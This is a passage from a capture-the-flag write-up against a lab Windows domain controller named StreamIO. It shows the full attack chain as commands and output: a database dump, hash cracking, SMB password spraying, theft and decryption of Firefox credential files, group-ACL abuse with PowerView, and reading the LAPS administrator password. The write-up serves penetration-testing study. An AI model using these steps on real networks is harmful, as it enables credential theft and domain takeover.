PS C:\inetpub\streamio.htb\admin> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select table_name from STREAMIO.information_schema.tables;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select table_name from STREAMIO.information_schema.tables;"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
```
`sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select *  from users;"`
```
PS C:\inetpub\streamio.htb\admin> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select *  from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d STREAMIO -Q "select *  from users;"
id          username                                           password                                           is_staff
----------- -------------------------------------------------- -------------------------------------------------- --------
          3 James                                              c660060492d9edcaa8332d89c99c9239                          1
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                          1
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                          1
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                          1
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                          1
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                          1
          9 Robert                                             f03b910e2bd0313a23fdd7575f34a694                          1
         10 Thane                                              3577c47eb1e12c8ba021611e1280753c                          1
         11 Carmon                                             35394484d89fcfdb3c5e447fe749d213                          1
         12 Barry                                              54c88b2dbd7b1a84012fabc1a4c73415                          1
         13 Oliver                                             fd78db29173a5cf701bd69027cb9bf6b                          1
         14 Michelle                                           b83439b16f844bd6ffe35c02fe21b3c0                          1
         15 Gloria                                             0cfaaaafb559f081df2befbe66686de0                          1
         16 Victoria                                           b22abb47a02b52d5dfa27fb0b534f693                          1
         17 Alexendra                                          1c2b3d8270321140e5153f6637d3ee53                          1
         18 Baxter                                             22ee218331afd081b0dcd8115284bae3                          1
         19 Clara                                              ef8f3d30a856cf166fb8215aca93e9ff                          1
         20 Barbra                                             3961548825e3e21df5646cafe11c6c76                          1
         21 Lenord                                             ee0b8a0937abd60c2882eacb2f8dc49f                          1
         22 Austin                                             0049ac57646627b8d7aeaccf8b6a936f                          1
         23 Garfield                                           8097cedd612cc37c29db152b6e9edbd3                          1
         24 Juliette                                           6dcd87740abb64edfa36d170f0d5450d                          1
         25 Victor                                             bf55e15b119860a6e6b5a164377da719                          1
         26 Lucifer                                            7df45a9e3de3863807c026ba48e55fb3                          1
         27 Bruno                                              2a4e2cf22dd8fcb45adcb91be1e22ae8                          1
         28 Diablo                                             ec33265e5fc8c2f1b0c137bb7b3632b5                          1
         29 Robin                                              dc332fb5576e9631c9dae83f194f8e70                          1
         30 Stan                                               384463526d288edcc95fc3701e523bc7                          1
         31 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                          1
         33 admin                                              665a50ac9eaa781e4f7f04199db97a11                          0

(30 rows affected)
```
after decode MD5 hashes, we summaried a list below:
```
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
use netexec to validate them
`└─$ netexec smb 10.129.4.76 -u user -p password.txt --continue-on-success --no-bruteforce`
```
SMB         10.129.4.76     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.4.76     445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
SMB         10.129.4.76     445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
SMB         10.129.4.76     445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.129.4.76     445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 
```
check the privi of the valid credential nikk37
`PS C:\inetpub\streamio.htb\admin> net user nikk37`
```
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:16 AM
Password expires             Never
Password changeable          2/23/2022 2:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 3:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         
The command completed successfully.
```
it is in group of remote user, so we can login using this.
`└─$ evil-winrm -i streamio.htb -u nikk37  -p 'get_dem_girls2@yahoo.com' `
```                                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
```
run winPeas, find firefox db file

Looking for Firefox DBs
```
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
```

https://github.com/lclevy/firepwd to crack this key4.db file.
`*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json`
```                                        
Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json to logins.json
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
                                        
Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db
```
`└─$ python3 ~/tools/firepwd/firepwd.py `
```
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```                                               
update user and passwrod files, brute force agamin
`└─$ netexec smb 10.129.4.76 -u user -p password.txt `
```
SMB         10.129.4.76     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.4.76     445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.129.4.76     445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.129.4.76     445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.129.4.76     445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```
but we cannot remote login using this credential
`└─$ netexec winrm streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r'`
```
WINRM       10.129.4.76     5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.4.76     5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```
#### Privi Escalate
run bloodhound of check this user
`JDgodd --owns-- CORE STAFF@STREAMIO.HTB --ReadLAPSPassword-- DC `
check the group "Core Staff"
`*Evil-WinRM* PS C:\Users\nikk37\Documents> net group "Core Staff"`
```
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
The command completed successfully.
```
As the user is not in the gourp yet, and we have owned this group, we just add it. use PowerView.ps1

upload Powerview.ps1.
```
*Evil-WinRM* PS C:\Users\nikk37\Documents> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Credential $cred  -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

`*Evil-WinRM* PS C:\Users\nikk37\Documents> net group "Core Staff"`
```
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.
```
and with privi of "ReadLAPSPassword", we can read the admin passwd as plaintexet
`*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred`
```
DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
ms-Mcs-AdmPwd     : -8/5IjMhO/0zpF
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```
or use blooyad
`└─$ bloodyAD --host 10.129.5.187 -d streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd`
```
distinguishedName: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: -8/5IjMhO/0zpF
```
login as admin
`evil-winrm -i streamio.htb -u Administrator -p "-8/5IjMhO/0zpF"`
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
```
but flag is not at desktop of admin.
after searching the AD, Martin is member of Administrators group. 
```
*Evil-WinRM* PS C:\Users> cd Martin\Desktop
*Evil-WinRM* PS C:\Users\Martin\Desktop> ls


    Directory: C:\Users\Martin\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/25/2026   5:53 AM             34 root.txt
```

#### lesson learned
- when trying SQLi, if it is possible try different columns, 1,2,3,4,5,6...., and the col;umn we can view might be any one of them.
- view the cource code if we can
- add member into a group , learn more funxtion of powerview
- privi es by 'ReadLAPSPassword'
